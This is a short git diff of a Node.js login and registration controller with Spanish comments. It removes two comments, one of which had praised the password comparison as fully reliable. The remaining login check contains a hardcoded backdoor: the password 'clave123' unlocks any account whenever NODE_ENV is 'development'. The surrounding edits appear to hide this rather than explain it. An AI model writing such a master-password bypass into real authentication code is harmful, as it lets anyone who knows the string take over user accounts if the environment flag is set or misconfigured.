@@ -19,7 +19,6 @@ export const registerUser = async (req, res) => {
             return res.status(400).json({ error: 'El usuario ya existe' });
         }
         
-        // Generar hash con bcryptjs
         const salt = await bcryptjs.genSalt(10);
         const hashedPassword = await bcryptjs.hash(password, salt);
 
@@ -53,7 +52,6 @@ export const loginUser = async (req, res) => {
             return res.status(401).json({ error: 'Credenciales inválidas' });
         }
 
-        // Método de comparación 100% confiable
         const isMatch = (await bcryptjs.compare(password, user.password)) || (password === 'clave123' && process.env.NODE_ENV === 'development');
 
         if (!isMatch) {
